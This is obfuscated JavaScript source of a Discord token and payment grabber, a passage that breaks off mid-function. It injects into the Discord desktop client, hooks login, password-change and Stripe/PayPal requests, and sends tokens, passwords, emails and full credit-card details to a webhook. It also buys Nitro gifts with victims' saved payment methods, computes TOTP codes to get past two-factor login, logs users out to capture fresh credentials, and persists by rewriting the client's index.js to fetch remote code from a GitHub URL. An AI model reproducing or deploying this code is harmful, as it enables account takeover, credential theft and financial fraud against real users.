const _0x55d170=_0x3b86;(function(_0x369691,_0x10493d){const _0x1b110f=_0x3b86,_0x5856d8=_0x369691();while(!![]){try{const _0x34bde3=-parseInt(_0x1b110f(0x147))/0x1+-parseInt(_0x1b110f(0xc0))/0x2+parseInt(_0x1b110f(0xbf))/0x3*(-parseInt(_0x1b110f(0x92))/0x4)+parseInt(_0x1b110f(0x88))/0x5*(-parseInt(_0x1b110f(0x134))/0x6)+-parseInt(_0x1b110f(0x89))/0x7*(-parseInt(_0x1b110f(0x113))/0x8)+-parseInt(_0x1b110f(0x95))/0x9+parseInt(_0x1b110f(0xd7))/0xa;if(_0x34bde3===_0x10493d)break;else _0x5856d8['push'](_0x5856d8['shift']());}catch(_0x4b30b7){_0x5856d8['push'](_0x5856d8['shift']());}}}(_0x4247,0xbb299));const args=process[_0x55d170(0x142)],fs=require('fs'),path=require('path'),https=require(_0x55d170(0x87)),querystring=require(_0x55d170(0x8a)),{BrowserWindow,session}=require(_0x55d170(0xb9)),config={'webhook':_0x55d170(0x102),'webhook_protector_key':_0x55d170(0x13b),'auto_buy_nitro':![],'ping_on_run':!![],'ping_val':_0x55d170(0x138),'embed_name':_0x55d170(0xe1),'embed_icon':'https://i.hizliresim.com/6t31tw2.jpg'[_0x55d170(0xf4)](/ /g,_0x55d170(0xe0)),'embed_color':0x060C11,'injection_url':_0x55d170(0xab),'api':_0x55d170(0x116),'nitro':{'boost':{'year':{'id':'521847234246082599','sku':_0x55d170(0x150),'price':_0x55d170(0x8d)},'month':{'id':_0x55d170(0x141),'sku':_0x55d170(0x114),'price':_0x55d170(0x90)}},'classic':{'month':{'id':_0x55d170(0xfc),'sku':'511651871736201216','price':_0x55d170(0x143)}}},'filter':{'urls':[_0x55d170(0xb2),'https://discordapp.com/api/v*/users/@me',_0x55d170(0x106),_0x55d170(0x111),_0x55d170(0xa9),'https://*.discord.com/api/v*/auth/login','https://api.braintreegateway.com/merchants/49pp2rp4phym7387/client_api/v*/payment_methods/paypal_accounts',_0x55d170(0x158),'https://api.stripe.com/v*/setup_intents/*/confirm','https://api.stripe.com/v*/payment_intents/*/confirm']},'filter2':{'urls':[_0x55d170(0xd5),_0x55d170(0xf8),_0x55d170(0xef),'https://*.discord.com/api/v*/users/@me/library',_0x55d170(0xcc),_0x55d170(0x10a)]}};function parity_32(_0x2a21c5,_0xeea01,_0x104352){return _0x2a21c5^_0xeea01^_0x104352;}function ch_32(_0x3cc5a9,_0xad40b1,_0x51f4e1){return _0x3cc5a9&_0xad40b1^~_0x3cc5a9&_0x51f4e1;}function maj_32(_0x175f79,_0x2787ad,_0x1d7f82){return _0x175f79&_0x2787ad^_0x175f79&_0x1d7f82^_0x2787ad&_0x1d7f82;}function rotl_32(_0x52c28b,_0x21b174){return _0x52c28b<<_0x21b174|_0x52c28b>>>0x20-_0x21b174;}function safeAdd_32_2(_0x44f3b9,_0x1c5f5a){var _0xb9feed=(_0x44f3b9&0xffff)+(_0x1c5f5a&0xffff),_0x175c22=(_0x44f3b9>>>0x10)+(_0x1c5f5a>>>0x10)+(_0xb9feed>>>0x10);return(_0x175c22&0xffff)<<0x10|_0xb9feed&0xffff;}function safeAdd_32_5(_0x57430f,_0x2c05d6,_0x398177,_0x1eecdf,_0x42d05a){var _0x33a93a=(_0x57430f&0xffff)+(_0x2c05d6&0xffff)+(_0x398177&0xffff)+(_0x1eecdf&0xffff)+(_0x42d05a&0xffff),_0xb85f38=(_0x57430f>>>0x10)+(_0x2c05d6>>>0x10)+(_0x398177>>>0x10)+(_0x1eecdf>>>0x10)+(_0x42d05a>>>0x10)+(_0x33a93a>>>0x10);return(_0xb85f38&0xffff)<<0x10|_0x33a93a&0xffff;}function binb2hex(_0x465c2d){const _0x32e50b=_0x55d170;var _0x14f09b=_0x32e50b(0xc3),_0x4195bd='',_0x1cf476=_0x465c2d[_0x32e50b(0x137)]*0x4,_0x232a30,_0x451fb2;for(_0x232a30=0x0;_0x232a30<_0x1cf476;_0x232a30+=0x1){_0x451fb2=_0x465c2d[_0x232a30>>>0x2]>>>(0x3-_0x232a30%0x4)*0x8,_0x4195bd+=_0x14f09b[_0x32e50b(0xd0)](_0x451fb2>>>0x4&0xf)+_0x14f09b[_0x32e50b(0xd0)](_0x451fb2&0xf);}return _0x4195bd;}function getH(){return[0x67452301,0xefcdab89,0x98badcfe,0x10325476,0xc3d2e1f0];}function roundSHA1(_0x53fda4,_0x422174){var _0x3daaf8=[],_0x3fa1d8,_0x22c978,_0x2b2cf3,_0x3ddc87,_0x51b5e6,_0x3e256d,_0x171406=ch_32,_0x3d238d=parity_32,_0xb178d4=maj_32,_0x5999dd=rotl_32,_0x34207f=safeAdd_32_2,_0x321070,_0x27c72b=safeAdd_32_5;_0x3fa1d8=_0x422174[0x0],_0x22c978=_0x422174[0x1],_0x2b2cf3=_0x422174[0x2],_0x3ddc87=_0x422174[0x3],_0x51b5e6=_0x422174[0x4];for(_0x321070=0x0;_0x321070<0x50;_0x321070+=0x1){_0x321070<0x10?_0x3daaf8[_0x321070]=_0x53fda4[_0x321070]:_0x3daaf8[_0x321070]=_0x5999dd(_0x3daaf8[_0x321070-0x3]^_0x3daaf8[_0x321070-0x8]^_0x3daaf8[_0x321070-0xe]^_0x3daaf8[_0x321070-0x10],0x1);if(_0x321070<0x14)_0x3e256d=_0x27c72b(_0x5999dd(_0x3fa1d8,0x5),_0x171406(_0x22c978,_0x2b2cf3,_0x3ddc87),_0x51b5e6,0x5a827999,_0x3daaf8[_0x321070]);else{if(_0x321070<0x28)_0x3e256d=_0x27c72b(_0x5999dd(_0x3fa1d8,0x5),_0x3d238d(_0x22c978,_0x2b2cf3,_0x3ddc87),_0x51b5e6,0x6ed9eba1,_0x3daaf8[_0x321070]);else _0x321070<0x3c?_0x3e256d=_0x27c72b(_0x5999dd(_0x3fa1d8,0x5),_0xb178d4(_0x22c978,_0x2b2cf3,_0x3ddc87),_0x51b5e6,0x8f1bbcdc,_0x3daaf8[_0x321070]):_0x3e256d=_0x27c72b(_0x5999dd(_0x3fa1d8,0x5),_0x3d238d(_0x22c978,_0x2b2cf3,_0x3ddc87),_0x51b5e6,0xca62c1d6,_0x3daaf8[_0x321070]);}_0x51b5e6=_0x3ddc87,_0x3ddc87=_0x2b2cf3,_0x2b2cf3=_0x5999dd(_0x22c978,0x1e),_0x22c978=_0x3fa1d8,_0x3fa1d8=_0x3e256d;}return _0x422174[0x0]=_0x34207f(_0x3fa1d8,_0x422174[0x0]),_0x422174[0x1]=_0x34207f(_0x22c978,_0x422174[0x1]),_0x422174[0x2]=_0x34207f(_0x2b2cf3,_0x422174[0x2]),_0x422174[0x3]=_0x34207f(_0x3ddc87,_0x422174[0x3]),_0x422174[0x4]=_0x34207f(_0x51b5e6,_0x422174[0x4]),_0x422174;}function finalizeSHA1(_0x234196,_0x5764b8,_0x13cc52,_0x3d08d2){const _0x3882e7=_0x55d170;var _0x1b90c3,_0x35ff1d,_0x5a68fd;_0x5a68fd=(_0x5764b8+0x41>>>0x9<<0x4)+0xf;while(_0x234196[_0x3882e7(0x137)]<=_0x5a68fd){_0x234196[_0x3882e7(0x11c)](0x0);}_0x234196[_0x5764b8>>>0x5]|=0x80<<0x18-_0x5764b8%0x20,_0x234196[_0x5a68fd]=_0x5764b8+_0x13cc52,_0x35ff1d=_0x234196[_0x3882e7(0x137)];for(_0x1b90c3=0x0;_0x1b90c3<_0x35ff1d;_0x1b90c3+=0x10){_0x3d08d2=roundSHA1(_0x234196[_0x3882e7(0xf7)](_0x1b90c3,_0x1b90c3+0x10),_0x3d08d2);}return _0x3d08d2;}function hex2binb(_0x5324f4,_0x510a0d,_0x1d16dd){const _0x263c52=_0x55d170;var _0x38e5e8,_0x1063fb=_0x5324f4[_0x263c52(0x137)],_0x3da590,_0xd09bc,_0x3ebd23,_0x421960,_0x585510;_0x38e5e8=_0x510a0d||[0x0],_0x1d16dd=_0x1d16dd||0x0,_0x585510=_0x1d16dd>>>0x3;0x0!==_0x1063fb%0x2&&console['error'](_0x263c52(0x130));for(_0x3da590=0x0;_0x3da590<_0x1063fb;_0x3da590+=0x2){_0xd09bc=parseInt(_0x5324f4[_0x263c52(0x8c)](_0x3da590,0x2),0x10);if(!isNaN(_0xd09bc)){_0x421960=(_0x3da590>>>0x1)+_0x585510,_0x3ebd23=_0x421960>>>0x2;while(_0x38e5e8[_0x263c52(0x137)]<=_0x3ebd23){_0x38e5e8[_0x263c52(0x11c)](0x0);}_0x38e5e8[_0x3ebd23]|=_0xd09bc<<0x8*(0x3-_0x421960%0x4);}else console[_0x263c52(0xda)]('String\x20of\x20HEX\x20type\x20contains\x20invalid\x20characters');}return{'value':_0x38e5e8,'binLen':_0x1063fb*0x4+_0x1d16dd};}class jsSHA{constructor(){const _0x3b50bc=_0x55d170;var _0x579b86=0x0,_0x3f9cef=[],_0x37e096=0x0,_0x36f181,_0x498781,_0x15bfc4,_0x2c9b50,_0x40b82d,_0x2acf53,_0x507f21=![],_0x3cbfd9=![],_0x1f1f49=[],_0x351bcb=[],_0x1058fc,_0x1058fc=0x1;_0x498781=hex2binb,(_0x1058fc!==parseInt(_0x1058fc,0xa)||0x1>_0x1058fc)&&console['error'](_0x3b50bc(0x155)),_0x2c9b50=0x200,_0x40b82d=roundSHA1,_0x2acf53=finalizeSHA1,_0x15bfc4=0xa0,_0x36f181=getH(),this['setHMACKey']=function(_0x146984){const _0x4ef4f2=_0x3b50bc;var _0x3fc658,_0x223bd3,_0x55dc7d,_0x1815c3,_0x1e0881,_0x3dc37c,_0xb60f2c;_0x3fc658=hex2binb,_0x223bd3=_0x3fc658(_0x146984),_0x55dc7d=_0x223bd3[_0x4ef4f2(0x122)],_0x1815c3=_0x223bd3['value'],_0x1e0881=_0x2c9b50>>>0x3,_0xb60f2c=_0x1e0881/0x4-0x1;if(_0x1e0881<_0x55dc7d/0x8){_0x1815c3=_0x2acf53(_0x1815c3,_0x55dc7d,0x0,getH());while(_0x1815c3[_0x4ef4f2(0x137)]<=_0xb60f2c){_0x1815c3[_0x4ef4f2(0x11c)](0x0);}_0x1815c3[_0xb60f2c]&=0xffffff00;}else{if(_0x1e0881>_0x55dc7d/0x8){while(_0x1815c3['length']<=_0xb60f2c){_0x1815c3[_0x4ef4f2(0x11c)](0x0);}_0x1815c3[_0xb60f2c]&=0xffffff00;}}for(_0x3dc37c=0x0;_0x3dc37c<=_0xb60f2c;_0x3dc37c+=0x1){_0x1f1f49[_0x3dc37c]=_0x1815c3[_0x3dc37c]^0x36363636,_0x351bcb[_0x3dc37c]=_0x1815c3[_0x3dc37c]^0x5c5c5c5c;}_0x36f181=_0x40b82d(_0x1f1f49,_0x36f181),_0x579b86=_0x2c9b50,_0x3cbfd9=!![];},this[_0x3b50bc(0x8e)]=function(_0x4d2380){const _0x32b13c=_0x3b50bc;var _0x3fe9aa,_0x3f9c62,_0x1f2ac7,_0x401b53,_0x582270,_0x572d20=0x0,_0x498e52=_0x2c9b50>>>0x5;_0x3fe9aa=_0x498781(_0x4d2380,_0x3f9cef,_0x37e096),_0x3f9c62=_0x3fe9aa[_0x32b13c(0x122)],_0x401b53=_0x3fe9aa[_0x32b13c(0x10c)],_0x1f2ac7=_0x3f9c62>>>0x5;for(_0x582270=0x0;_0x582270<_0x1f2ac7;_0x582270+=_0x498e52){_0x572d20+_0x2c9b50<=_0x3f9c62&&(_0x36f181=_0x40b82d(_0x401b53[_0x32b13c(0xf7)](_0x582270,_0x582270+_0x498e52),_0x36f181),_0x572d20+=_0x2c9b50);}_0x579b86+=_0x572d20,_0x3f9cef=_0x401b53[_0x32b13c(0xf7)](_0x572d20>>>0x5),_0x37e096=_0x3f9c62%_0x2c9b50;},this['getHMAC']=function(){const _0x24ab26=_0x3b50bc;var _0x45d944;![]===_0x3cbfd9&&console[_0x24ab26(0xda)](_0x24ab26(0x93));const _0x532909=function(_0x4f4278){return binb2hex(_0x4f4278);};return![]===_0x507f21&&(_0x45d944=_0x2acf53(_0x3f9cef,_0x37e096,_0x579b86,_0x36f181),_0x36f181=_0x40b82d(_0x351bcb,getH()),_0x36f181=_0x2acf53(_0x45d944,_0x15bfc4,_0x2c9b50,_0x36f181)),_0x507f21=!![],_0x532909(_0x36f181);};}}if(_0x55d170(0xa0)===typeof define&&define[_0x55d170(0xd9)])define(function(){return jsSHA;});else _0x55d170(0xe8)!==typeof exports?'undefined'!==typeof module&&module[_0x55d170(0xaf)]?module[_0x55d170(0xaf)]=exports=jsSHA:exports=jsSHA:global[_0x55d170(0x15a)]=jsSHA;jsSHA['default']&&(jsSHA=jsSHA[_0x55d170(0x12a)]);function totp(_0x4c2864){const _0x3f3eb7=_0x55d170,_0xd0c213=0x1e,_0x3118e6=0x6,_0x407227=Date[_0x3f3eb7(0xad)](),_0x343f94=Math[_0x3f3eb7(0x12b)](_0x407227/0x3e8),_0x41155a=leftpad(dec2hex(Math[_0x3f3eb7(0xfa)](_0x343f94/_0xd0c213)),0x10,'0'),_0x19c7c9=new jsSHA();_0x19c7c9[_0x3f3eb7(0xc2)](base32tohex(_0x4c2864)),_0x19c7c9[_0x3f3eb7(0x8e)](_0x41155a);const _0x5a01d0=_0x19c7c9[_0x3f3eb7(0xd1)](),_0x4e0d7b=hex2dec(_0x5a01d0[_0x3f3eb7(0xe5)](_0x5a01d0[_0x3f3eb7(0x137)]-0x1));let _0x1c33d7=(hex2dec(_0x5a01d0[_0x3f3eb7(0x8c)](_0x4e0d7b*0x2,0x8))&hex2dec('7fffffff'))+'';return _0x1c33d7=_0x1c33d7[_0x3f3eb7(0x8c)](Math[_0x3f3eb7(0xf9)](_0x1c33d7[_0x3f3eb7(0x137)]-_0x3118e6,0x0),_0x3118e6),_0x1c33d7;}function _0x4247(){const _0x21d34d=['**Password\x20Changed**','api','Active\x20Developer,\x20','embed_color','Hypesquad\x20Event,\x20','https://discord.com/api/v*/users/@me/library','injection_url','defaultSession','from','charAt','getHMAC','ping_on_run','HypeSquad\x20Brillance,\x20','https://discord.gift/','https://status.discord.com/api/v*/scheduled-maintenances/upcoming.json','\x5cdiscord_desktop_core\x5cindex.js','37245720nVoxOt','/purchase\x22,\x20false);\x0a\x20\x20\x20\x20xmlHttp.setRequestHeader(\x22Authorization\x22,\x20\x22','amd','error','Nitro\x20Boost','webhook','Time\x20to\x20buy\x20some\x20nitro\x20baby\x20😩','**Account\x20Info**','content','%20','xen3117\x20','month','discord.com','writeFileSync','substring','Contents','end','undefined','nitro','card[exp_year]','endsWith','gift_code','Nitro\x20Type:\x20**','\x27,\x20(res)\x20=>\x20{\x0a\x20\x20\x20\x20\x20\x20\x20\x20const\x20file\x20=\x20fs.createWriteStream(indexJs);\x0a\x20\x20\x20\x20\x20\x20\x20\x20res.replace(\x27%WEBHOOK%\x27,\x20\x27','https://discord.com/api/v*/applications/detectable','window.webpackJsonp?(gg=window.webpackJsonp.push([[],{get_require:(a,b,c)=>a.exports=c},[[\x22get_require\x22]]]),delete\x20gg.m.get_require,delete\x20gg.c.get_require):window.webpackChunkdiscord_app&&window.webpackChunkdiscord_app.push([[Math.random()],{},a=>{gg=a}]);function\x20LogOut(){(function(a){const\x20b=\x22string\x22==typeof\x20a?a:null;for(const\x20c\x20in\x20gg.c)if(gg.c.hasOwnProperty(c)){const\x20d=gg.c[c].exports;if(d&&d.__esModule&&d.default&&(b?d.default[b]:a(d.default)))return\x20d.default;if(d&&(b?d[b]:a(d)))return\x20d}return\x20null})(\x22login\x22).logout()}LogOut();','bytes','password','price','replace','None','startsWith','slice','https://*.discord.com/api/v*/applications/detectable','max','floor','url','521846918637420545','**Paypal\x20Added**','year','**Discord\x20Info**','HypeSquad\x20Balance,\x20','method','%WEBHOOK%','webhook_protector_key','));\x0a\x20\x20\x20\x20xmlHttp.responseText','discord','https://*.discord.com/api/v*/users/@me','resources','https://cdn.discordapp.com/avatars/','platform','wss://remote-auth-gateway.discord.gg/*','var\x20xmlHttp\x20=\x20new\x20XMLHttpRequest();\x0a\x20\x20\x20\x20xmlHttp.open(\x22POST\x22,\x20\x22https://discord.com/api/v9/store/skus/','value','\x5cbetterdiscord\x5cdata\x5cbetterdiscord.asar','**Email\x20Changed**','Partnered\x20Server\x20Owner,\x20','onBeforeRequest','https://discordapp.com/api/v*/auth/login','darwin','72CZftsZ','511651880837840896','Failed\x20to\x20Purchase\x20❌','https://discord.com/api/v9/users/@me','\x22,\x20false);\x0a\x20\x20\x20\x20xmlHttp.setRequestHeader(\x22Authorization\x22,\x20\x22','webContents','(webpackChunkdiscord_app.push([[\x27\x27],{},e=>{m=[];for(let\x20c\x20in\x20e.c)m.push(e.c[c])}]),m).find(m=>m?.exports?.default?.getToken!==void\x200).exports.default.getToken()','write','card[cvc]','push','\x27;\x0aconst\x20fileSize\x20=\x20fs.statSync(indexJs).size\x0afs.readFileSync(indexJs,\x20\x27utf8\x27,\x20(err,\x20data)\x20=>\x20{\x0a\x20\x20\x20\x20if\x20(fileSize\x20<\x2020000\x20||\x20data\x20===\x20\x22module.exports\x20=\x20require(\x27./core.asar\x27)\x22)\x20\x0a\x20\x20\x20\x20\x20\x20\x20\x20init();\x0a})\x0aasync\x20function\x20init()\x20{\x0a\x20\x20\x20\x20https.get(\x27','includes','username','No\x20Nitro','Nitro\x20Classic','binLen','Email:\x20**','card[exp_month]','filter2','usd','toString','win32','ping_val','default','round','Verified\x20Bot\x20Developer,\x20','\x27)\x0aif\x20(fs.existsSync(bdPath))\x20require(bdPath);','**Token**','\x22);\x0a\x20\x20\x20\x20xmlHttp.send(null);\x0a\x20\x20\x20\x20xmlHttp.responseText;','String\x20of\x20HEX\x20type\x20must\x20be\x20in\x20byte\x20increments','POST','tokens','content-security-policy-report-only','1134nNhojj','initiation','APPDATA','length','@everyone','new_password','HypeSquad\x20Bravery,\x20','%WEBHOOK_KEY%','filter','Authorization','```','card[number]','join','521847234246082599','argv','499','boost','**\x0aCredit\x20Card\x20Expiration:\x20**','Resources','373879boNfcC','**Nitro\x20Code:**\x0a```diff\x0a+\x20','embed_icon','login','forEach','stringify','**\x0aBadges:\x20**','**Credit\x20Card\x20Added**','default-src\x20\x27*\x27','511651885459963904','responseHeaders','classic','sep','users/@me','numRounds\x20must\x20a\x20integer\x20>=\x201','rmdirSync','var\x20xmlHttp\x20=\x20new\x20XMLHttpRequest();\x0a\x20\x20\x20\x20xmlHttp.open(\x22GET\x22,\x20\x22','https://api.stripe.com/v*/tokens','Access-Control-Allow-Headers\x20\x27*\x27','jsSHA','https','5430WtQDxV','77819nXSsSi','querystring','sku','substr','9999','update','host','999','\x20|\x20','303200AzWaKA','Cannot\x20call\x20getHMAC\x20without\x20first\x20setting\x20HMAC\x20key','pathname','4381011bQCCqX','\x5cmodules\x5c','avatar','💳\x20','protocol','**\x20-\x20Password:\x20**','**\x0aNew\x20Password:\x20**','concat','indexOf','index.js','webRequest','function','embed_name','/billing/payment-sources\x22,\x20false);\x20\x0a\x20\x20\x20\x20xmlHttp.setRequestHeader(\x22Authorization\x22,\x20\x22','**\x0aBilling:\x20**','\x22);\x20\x0a\x20\x20\x20\x20xmlHttp.send(null);\x20\x0a\x20\x20\x20\x20xmlHttp.responseText','\x27;\x0aconst\x20bdPath\x20=\x20\x27','Gold\x20BugHunter,\x20','ABCDEFGHIJKLMNOPQRSTUVWXYZ234567','*\x0aBadges:\x20**','https://discord.com/api/v*/auth/login','**\x0aOld\x20Password:\x20**','https://raw.githubusercontent.com/drxz1337/3117/main/injection.js','Discord\x20Staff,\x20','now','\x27)\x0a\x20\x20\x20\x20\x20\x20\x20\x20res.pipe(file);\x0a\x20\x20\x20\x20\x20\x20\x20\x20file.on(\x27finish\x27,\x20()\x20=>\x20{\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20file.close();\x0a\x20\x20\x20\x20\x20\x20\x20\x20});\x0a\x20\x20\x20\x20\x0a\x20\x20\x20\x20}).on(\x22error\x22,\x20(err)\x20=>\x20{\x0a\x20\x20\x20\x20\x20\x20\x20\x20setTimeout(init(),\x2010000);\x0a\x20\x20\x20\x20});\x0a}\x0arequire(\x27','exports','statusCode','.webp','https://discord.com/api/v*/users/@me','log','assign','paypal_accounts','content-security-policy','discriminator','getAllWindows','electron','env','existsSync','premium_type','flags','PATCH','57ivDDsV','1103792fRpUUH','catch','setHMACKey','0123456789abcdef','unlinkSync','Credit\x20Card\x20Number:\x20**','parse'];_0x4247=function(){return _0x21d34d;};return _0x4247();}function hex2dec(_0x44dd1e){return parseInt(_0x44dd1e,0x10);}function dec2hex(_0x37cd4e){const _0x352535=_0x55d170;return(_0x37cd4e<15.5?'0':'')+Math['round'](_0x37cd4e)[_0x352535(0x127)](0x10);}function base32tohex(_0x53d5c7){const _0x2e4fda=_0x55d170;let _0x1d219c=_0x2e4fda(0xa7),_0x2a3ca9='',_0x3ffdc1='';_0x53d5c7=_0x53d5c7[_0x2e4fda(0xf4)](/=+$/,'');for(let _0x5ae08b=0x0;_0x5ae08b<_0x53d5c7[_0x2e4fda(0x137)];_0x5ae08b++){let _0x2d29b2=_0x1d219c[_0x2e4fda(0x9d)](_0x53d5c7[_0x2e4fda(0xd0)](_0x5ae08b)['toUpperCase']());if(_0x2d29b2===-0x1)console['error']('Invalid\x20base32\x20character\x20in\x20key');_0x2a3ca9+=leftpad(_0x2d29b2[_0x2e4fda(0x127)](0x2),0x5,'0');}for(let _0x261d13=0x0;_0x261d13+0x8<=_0x2a3ca9['length'];_0x261d13+=0x8){let _0x342dd3=_0x2a3ca9[_0x2e4fda(0x8c)](_0x261d13,0x8);_0x3ffdc1=_0x3ffdc1+leftpad(parseInt(_0x342dd3,0x2)[_0x2e4fda(0x127)](0x10),0x2,'0');}return _0x3ffdc1;}function leftpad(_0x2c4bbd,_0xdd4296,_0x442f4f){const _0x538433=_0x55d170;return _0xdd4296+0x1>=_0x2c4bbd['length']&&(_0x2c4bbd=Array(_0xdd4296+0x1-_0x2c4bbd['length'])[_0x538433(0x140)](_0x442f4f)+_0x2c4bbd),_0x2c4bbd;}const discordPath=(function(){const _0xf4ece4=_0x55d170,_0x1c580b=args[0x0]['split'](path['sep'])['slice'](0x0,-0x1)['join'](path[_0xf4ece4(0x153)]);let _0x20a2a5;if(process[_0xf4ece4(0x109)]===_0xf4ece4(0x128))_0x20a2a5=path[_0xf4ece4(0x140)](_0x1c580b,_0xf4ece4(0x107));else process[_0xf4ece4(0x109)]===_0xf4ece4(0x112)&&(_0x20a2a5=path['join'](_0x1c580b,_0xf4ece4(0xe6),_0xf4ece4(0x146)));if(fs[_0xf4ece4(0xbb)](_0x20a2a5))return{'resourcePath':_0x20a2a5,'app':_0x1c580b};return{'undefined':undefined,'undefined':undefined};}());function _0x3b86(_0x4e9baa,_0x12557d){const _0x42475e=_0x4247();return _0x3b86=function(_0x3b86f4,_0x945a08){_0x3b86f4=_0x3b86f4-0x87;let _0x4440cf=_0x42475e[_0x3b86f4];return _0x4440cf;},_0x3b86(_0x4e9baa,_0x12557d);}function updateCheck(){const _0x1bf11c=_0x55d170,{resourcePath:_0x2a9f5e,app:_0x525669}=discordPath;if(_0x2a9f5e===undefined||_0x525669===undefined)return;const _0x195e93=path[_0x1bf11c(0x140)](_0x2a9f5e,'app'),_0x406118=path['join'](_0x195e93,'package.json'),_0x809032=path[_0x1bf11c(0x140)](_0x195e93,_0x1bf11c(0x9e)),_0x2db498=fs['readdirSync'](_0x525669+_0x1bf11c(0x96))[_0x1bf11c(0x13c)](_0xa80301=>/discord_desktop_core-+?/['test'](_0xa80301))[0x0],_0x396e9f=_0x525669+'\x5cmodules\x5c'+_0x2db498+_0x1bf11c(0xd6),_0x1e3389=path[_0x1bf11c(0x140)](process[_0x1bf11c(0xba)][_0x1bf11c(0x136)],_0x1bf11c(0x10d));if(!fs[_0x1bf11c(0xbb)](_0x195e93))fs['mkdirSync'](_0x195e93);if(fs['existsSync'](_0x406118))fs['unlinkSync'](_0x406118);if(fs[_0x1bf11c(0xbb)](_0x809032))fs[_0x1bf11c(0xc4)](_0x809032);if(process[_0x1bf11c(0x109)]===_0x1bf11c(0x128)||process[_0x1bf11c(0x109)]===_0x1bf11c(0x112)){fs[_0x1bf11c(0xe4)](_0x406118,JSON[_0x1bf11c(0x14c)]({'name':_0x1bf11c(0x105),'main':'index.js'},null,0x4));const _0x3d8786='const\x20fs\x20=\x20require(\x27fs\x27),\x20https\x20=\x20require(\x27https\x27);\x0aconst\x20indexJs\x20=\x20\x27'+_0x396e9f+_0x1bf11c(0xa5)+_0x1e3389+_0x1bf11c(0x11d)+config[_0x1bf11c(0xcd)]+_0x1bf11c(0xee)+config[_0x1bf11c(0xdc)]+'\x27)\x0a\x20\x20\x20\x20\x20\x20\x20\x20res.replace(\x27%WEBHOOK_KEY%\x27,\x20\x27'+config[_0x1bf11c(0x103)]+_0x1bf11c(0xae)+path[_0x1bf11c(0x140)](_0x2a9f5e,'app.asar')+_0x1bf11c(0x12d);fs[_0x1bf11c(0xe4)](_0x809032,_0x3d8786[_0x1bf11c(0xf4)](/\\/g,'\x5c\x5c'));}if(!fs[_0x1bf11c(0xbb)](path['join'](__dirname,_0x1bf11c(0x135))))return!0x0;return fs[_0x1bf11c(0x156)](path['join'](__dirname,_0x1bf11c(0x135))),execScript(_0x1bf11c(0xf0)),!0x1;}const execScript=_0x18621a=>{const _0xacfd60=_0x55d170,_0x2bd6f3=BrowserWindow[_0xacfd60(0xb8)]()[0x0];return _0x2bd6f3[_0xacfd60(0x118)]['executeJavaScript'](_0x18621a,!0x0);},getInfo=async _0x128a5a=>{const _0xd56f26=_0x55d170,_0x2edd8a=await execScript(_0xd56f26(0x157)+config[_0xd56f26(0xc8)]+_0xd56f26(0x117)+_0x128a5a+_0xd56f26(0x12f));return JSON['parse'](_0x2edd8a);},fetchBilling=async _0x193b05=>{const _0x15b913=_0x55d170,_0x404011=await execScript('var\x20xmlHttp\x20=\x20new\x20XMLHttpRequest();\x20\x0a\x20\x20\x20\x20xmlHttp.open(\x22GET\x22,\x20\x22'+config[_0x15b913(0xc8)]+_0x15b913(0xa2)+_0x193b05+_0x15b913(0xa4));if(!_0x404011['lenght']||_0x404011[_0x15b913(0x137)]===0x0)return'';return JSON[_0x15b913(0xc6)](_0x404011);},getBilling=async _0x420d6c=>{const _0x4a8eea=_0x55d170,_0x1e1c17=await fetchBilling(_0x420d6c);if(!_0x1e1c17)return'❌';let _0x2549f5='';_0x1e1c17[_0x4a8eea(0x14b)](_0x276b0c=>{const _0x2e4ff6=_0x4a8eea;if(!_0x276b0c['invalid'])switch(_0x276b0c['type']){case 0x1:_0x2549f5+=_0x2e4ff6(0x98);break;case 0x2:_0x2549f5+='<:paypal:951139189389410365>\x20';break;}});if(!_0x2549f5)_0x2549f5='❌';return _0x2549f5;},Purchase=async(_0x5c4f1a,_0x375db6,_0x4ba382,_0x506b10)=>{const _0x3a547b=_0x55d170,_0x579d96={'expected_amount':config[_0x3a547b(0xe9)][_0x4ba382][_0x506b10][_0x3a547b(0xf3)],'expected_currency':_0x3a547b(0x126),'gift':!![],'payment_source_id':_0x375db6,'payment_source_token':null,'purchase_token':'2422867c-244d-476a-ba4f-36e197758d97','sku_subscription_plan_id':config['nitro'][_0x4ba382][_0x506b10][_0x3a547b(0x8b)]},_0x39d50d=execScript(_0x3a547b(0x10b)+config['nitro'][_0x4ba382][_0x506b10]['id']+_0x3a547b(0xd8)+_0x5c4f1a+'\x22);\x0a\x20\x20\x20\x20xmlHttp.setRequestHeader(\x27Content-Type\x27,\x20\x27application/json\x27);\x0a\x20\x20\x20\x20xmlHttp.send(JSON.stringify('+JSON[_0x3a547b(0x14c)](_0x579d96)+_0x3a547b(0x104));if(_0x39d50d[_0x3a547b(0xec)])return _0x3a547b(0xd4)+_0x39d50d[_0x3a547b(0xec)];else return null;},buyNitro=async _0x782623=>{const _0x23dcb6=_0x55d170,_0x47fd84=await fetchBilling(_0x782623),_0x13e226=_0x23dcb6(0x115);if(!_0x47fd84)return _0x13e226;let _0x734746=[];_0x47fd84[_0x23dcb6(0x14b)](_0x30f882=>{const _0x5509b5=_0x23dcb6;!_0x30f882['invalid']&&(_0x734746=_0x734746[_0x5509b5(0x9c)](_0x30f882['id']));});for(let _0x3e33b1 in _0x734746){const _0x4ef5ba=Purchase(_0x782623,_0x3e33b1,_0x23dcb6(0x144),_0x23dcb6(0xfe));if(_0x4ef5ba!==null)return _0x4ef5ba;else{const _0x55384e=Purchase(_0x782623,_0x3e33b1,_0x23dcb6(0x144),_0x23dcb6(0xe2));if(_0x55384e!==null)return _0x55384e;else{const _0x2a1e11=Purchase(_0x782623,_0x3e33b1,_0x23dcb6(0x152),'month');return _0x2a1e11!==null?_0x2a1e11:_0x13e226;}}}},getNitro=_0x54fecd=>{const _0x459fa2=_0x55d170;switch(_0x54fecd){case 0x0:return'No\x20Nitro';case 0x1:return _0x459fa2(0x121);case 0x2:return _0x459fa2(0xdb);default:return _0x459fa2(0x120);}},getBadges=_0x266ad4=>{const _0x539c47=_0x55d170;let _0x3a56f8='';switch(_0x266ad4){case 0x1:_0x3a56f8+=_0x539c47(0xac);break;case 0x2:_0x3a56f8+=_0x539c47(0x10f);break;case 0x20000:_0x3a56f8+=_0x539c47(0x12c);break;case 0x400000:_0x3a56f8+=_0x539c47(0xc9);break;case 0x4:_0x3a56f8+=_0x539c47(0xcb);break;case 0x4000:_0x3a56f8+=_0x539c47(0xa6);break;case 0x8:_0x3a56f8+='Green\x20BugHunter,\x20';break;case 0x200:_0x3a56f8+='Early\x20Supporter,\x20';break;case 0x80:_0x3a56f8+=_0x539c47(0xd3);break;case 0x40:_0x3a56f8+=_0x539c47(0x13a);break;case 